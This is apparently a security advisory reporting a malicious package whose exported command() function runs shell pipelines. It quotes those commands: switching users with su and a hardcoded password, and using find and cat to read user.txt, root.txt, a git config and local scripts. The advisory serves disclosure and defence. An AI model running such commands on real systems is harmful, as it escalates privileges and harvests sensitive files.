summary: Package exports a hidden privilege-escalation and sensitive-file harvesting routine
details: The package's sole export `command()` in index.js is an exploitation artifact with no legitimate purpose. When invoked, it runs four shell pipelines via `child_process.exec`: (1) `echo "jL8P391xthN4qxqwxv" | su - internal -c "cat ~/user.txt; id; echo FLAG2_OK"` — privilege escalation to a local `internal` account using a hardcoded password and reading that user's `user.txt`; (2) reads `/opt/scripts/internallib/.git/config`; (3) `find /home -name user.txt` and `find /root -name root.txt` followed by `cat` to harvest CTF-flag-style files from other users' and root's home directories; (4) `ls -la /opt/scripts/` and `cat /opt/scripts/local_check.sh` to enumerate and read host-local scripts. The function is named `command` with no README, no description, no author, and no repository in package.json — the metadata is a bare `{name, version, main}` stub. CTF-style marker strings (`VERT16X_ESCALATE`, `FLAG2_OK`) confirm the artifact's exploitation intent. No lifecycle hooks fire on install or require, but any consumer that imports and calls the exported API attempts local privilege escalation and exfiltrates sensitive files into the caller's process output.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
